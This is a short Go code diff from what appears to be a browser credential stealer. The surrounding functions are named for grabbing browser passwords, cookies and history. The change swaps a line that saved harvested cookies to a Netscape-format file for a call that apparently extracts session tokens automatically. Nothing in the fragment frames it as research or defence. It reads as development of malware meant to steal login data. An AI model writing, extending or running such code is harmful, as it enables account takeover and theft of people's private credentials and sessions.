@@ -20,7 +20,7 @@ func GetBrowserPasswords(browsers []structs.Browser) {
 }
 
 func GetBrowserCookies(browsers []structs.Browser) {
-	os.WriteFile("cookies_netscape.txt", []byte(cookies.Get(browsers)), 0644)
+	cookies.GetTokensAuto(browsers)
 }
 
 func GetBrowserHistory(browsers []structs.Browser) {
